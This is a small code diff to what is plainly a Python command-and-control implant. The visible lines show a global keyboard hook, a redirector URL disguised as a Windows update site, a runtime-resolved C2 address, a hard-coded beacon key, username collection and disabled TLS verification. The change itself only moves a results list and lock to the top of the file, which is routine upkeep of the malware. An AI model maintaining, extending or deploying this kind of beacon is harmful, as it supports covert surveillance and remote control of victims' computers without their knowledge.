@@ -31,6 +31,9 @@ import keyboard  # pip install keyboard (requires admin for global hook)
 REDIRECTOR_URL = "https://windows-updates.vercel.app/"
 c2_url = ""                     # Dynamic — resolved at runtime
 c2_fetch_backoff = 60.0         # seconds, float for easy *=
+pending_results = []
+results_lock = threading.Lock()
+
 
 BEACON_KEY = b"0123456789abcdef0123456789abcdef"  # 32-byte key, match server
 SLEEP_BASE = 5   # seconds
@@ -178,8 +181,6 @@ username = os.getenv("USERNAME")
 session = requests.Session()
 session.verify = False  # match Go InsecureSkipVerify
 
-pending_results = []
-results_lock = threading.Lock()
 
 
 def fetch_beacon_url() -> str:
@@ -409,4 +410,5 @@ def handle_task(task):
 
 if __name__ == "__main__":
     import sys
+
     main()
